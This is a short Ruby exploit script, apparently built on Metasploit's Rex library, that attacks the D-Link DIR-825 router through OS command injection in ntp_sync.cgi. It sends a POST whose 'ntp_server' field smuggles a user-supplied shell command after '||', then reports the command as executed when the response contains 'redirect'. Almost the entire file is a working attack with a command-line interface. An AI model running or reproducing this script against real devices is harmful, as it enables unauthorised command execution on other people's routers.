#!/usr/bin/env ruby
# ftp://ftp2.dlink.com/SECURITY_ADVISEMENTS/DIR-825/REVB/DIR-825_REVB1_FIRMWARE_PATCH_v2.10B02.zip

require 'rex'

host = ARGV[0]
cmd  = ARGV[1]

def usage
 puts "[*] DLINK DIR-825 ntp_sync.cgi OS command injection"
 puts "[*] #{$0} <host> [cmd]"
 exit
end

usage if ARGV.size < 1

begin
sock = Rex::Proto::Http::Client.new(host, 
                                    port = 80, 
                                    context = {}, 
                                    ssl = false)

req = sock.request_cgi(
{
	'uri'   => '/ntp_sync.cgi',
	'version' => '1.0',
	'method' => 'POST',
        'data' => "ntp_server=||#{cmd}",
        'headers' => {
         'Upgrade-Insecure-Request' => '1',
         'Referer' => "http://#{host}/",
         'Connection' => 'close',
         'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        },
})

sock.send_request(req)
data = sock.read_response()

if data.body.include?("redirect")
 puts "[*] Executed command: #{cmd}"
else
 return 
end
rescue => e
puts "[!] #{e.to_s}"
end
